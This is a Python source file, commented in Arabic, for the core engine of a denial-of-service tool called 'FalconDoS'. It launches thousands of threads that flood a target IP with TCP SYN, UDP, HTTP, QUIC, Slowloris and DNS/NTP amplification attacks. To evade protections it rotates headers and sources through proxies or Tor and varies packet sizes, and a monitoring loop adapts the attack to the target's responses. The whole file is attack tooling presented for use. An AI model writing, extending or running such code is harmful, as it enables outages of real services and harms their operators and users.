import threading
import random
import time
from protocols import tcp_syn, udp_flood, http_flood, dns_amp, ntp_amp, quic_flood, slowloris
from stealth import header_mutator, proxy_rotator
from core import ai_analyzer

class AttackEngine:
    """
    المحرك الرئيسي لهجمات FalconDoS:
    يدير الهجوم على عدة منافذ وبروتوكولات في نفس الوقت،
    ويستخدم الذكاء الاصطناعي لتعديل استراتيجية الهجوم ديناميكيًا.
    """

    def __init__(self, target_ip, ports, protocols, threads_per_port=1000, duration=60):
        """
        تهيئة المحرك:
        - target_ip: عنوان الهدف
        - ports: قائمة المنافذ المستهدفة (يمكن رقم واحد أو قائمة)
        - protocols: البروتوكولات المستخدمة في الهجوم (مثل ["TCP", "HTTP"])
        - threads_per_port: عدد الخيوط (threads) لكل بروتوكول على كل منفذ
        - duration: مدة الهجوم بالثواني
        """
        self.target_ip = target_ip
        self.ports = ports if isinstance(ports, list) else [ports]  # نتأكد أنها قائمة
        self.protocols = protocols
        self.threads_per_port = threads_per_port
        self.duration = duration

        self.threads = []  # لتخزين جميع الخيوط النشطة
        self.running = True  # حالة الهجوم (مستمرة أو متوقفة)

        # تتبع حالة كل بروتوكول (مفعل أو لا)
        self.protocol_status = {p: True for p in self.protocols}

    def start(self):
        """
        تبدأ الهجوم:
        - تنشئ الخيوط لكل بروتوكول ولكل منفذ
        - تبدأ مراقب الذكاء الاصطناعي لتعديل الهجوم
        - تستمر مدة محددة ثم توقف كل الخيوط
        """
        print(f"[INFO] بدء الهجوم على {self.target_ip} المنافذ: {self.ports} البروتوكولات: {self.protocols}")

        # تشغيل الخيوط لكل منفذ وبروتوكول مفعل
        for port in self.ports:
            for protocol in self.protocols:
                if self.protocol_status.get(protocol, True):
                    for _ in range(self.threads_per_port):
                        t = threading.Thread(target=self.attack_runner, args=(protocol, port))
                        t.daemon = True  # تضمن إغلاق الخيوط مع إغلاق البرنامج
                        t.start()
                        self.threads.append(t)

        # بدء مراقب الذكاء الاصطناعي في Thread مستقل
        ai_thread = threading.Thread(target=self.ai_monitor)
        ai_thread.daemon = True
        ai_thread.start()

        # الاستمرار في الهجوم للمدة المحددة
        time.sleep(self.duration)
        self.running = False  # إشارة لإيقاف الهجوم

        # انتظار انتهاء الخيوط مع مهلة قصيرة لكل منها
        for t in self.threads:
            t.join(timeout=1)

        print("[INFO] انتهى الهجوم.")

    def attack_runner(self, protocol, port):
        """
        الدالة التي تنفذ الهجوم:
        - تعمل في حلقة مستمرة طالما الهجوم شغال والبروتوكول مفعل
        - تولد بيانات التخفّي (رؤوس HTTP، IP مصدر عشوائي، حجم حزمة عشوائي)
        - تستدعي دالة الهجوم الخاصة بالبروتوكول
        - تضيف تأخير صغير لتوزيع الحمل
        """
        while self.running and self.protocol_status.get(protocol, True):
            # توليد رؤوس HTTP عشوائية فقط للبروتوكولات التي تحتاجها
            headers = header_mutator.random_headers() if protocol in ["HTTP", "QUIC", "SLOWLORIS"] else {}

            # اختيار IP مصدر عشوائي عبر بروكسي أو تور
            ip_source = proxy_rotator.get_random_proxy()

            # اختيار حجم الحزمة عشوائي من 512 إلى 4096 بايت (للتنوع وتجاوز الحماية)
            packet_size = random.randint(512, 4096)

            try:
                # استدعاء دالة الهجوم الخاصة بالبروتوكول
                if protocol == "TCP":
                    tcp_syn.attack(self.target_ip, port, packet_size, ip_source)
                elif protocol == "UDP":
                    udp_flood.attack(self.target_ip, port, packet_size, ip_source)
                elif protocol == "HTTP":
                    http_flood.attack(self.target_ip, port, headers, ip_source)
                elif protocol == "DNS_AMP":
                    dns_amp.attack(self.target_ip, port, packet_size, ip_source)
                elif protocol == "NTP_AMP":
                    ntp_amp.attack(self.target_ip, port, packet_size, ip_source)
                elif protocol == "QUIC":
                    quic_flood.attack(self.target_ip, port, headers, ip_source)
                elif protocol == "SLOWLORIS":
                    slowloris.attack(self.target_ip, port, headers, ip_source)
            except Exception as e:
                print(f"[ERROR] خطأ في الهجوم باستخدام {protocol} على المنفذ {port}: {e}")

            # تأخير صغير لتوزيع الحزم بشكل متوازن وعدم إرسالها دفعة واحدة
            time.sleep(0.001)

    def ai_monitor(self):
        """
        مراقب الذكاء الاصطناعي:
        - يستدعي وحدة التحليل AI لتحليل ردود الهدف كل 5 ثواني
        - إذا اكتشف حجب أو تحدي، يمكنه تعديل استراتيجية الهجوم
        - (مثلاً تعطيل بروتوكول معين أو تقليل عدد الخيوط)
        """
        while self.running:
            change_needed = ai_analyzer.analyze(self.target_ip)
            if change_needed:
                print("[AI] تعديل استراتيجية الهجوم بناءً على ردود الهدف.")
                # هنا يمكن إضافة منطق ذكي لإدارة البروتوكولات
                # مثال (غير مفعّل):
                # for protocol in self.protocols:
                #     self.protocol_status[protocol] = False
                #     print(f"[AI] تم تعطيل البروتوكول: {protocol}")

            time.sleep(5)  # الانتظار 5 ثواني قبل التحقق مجددًا
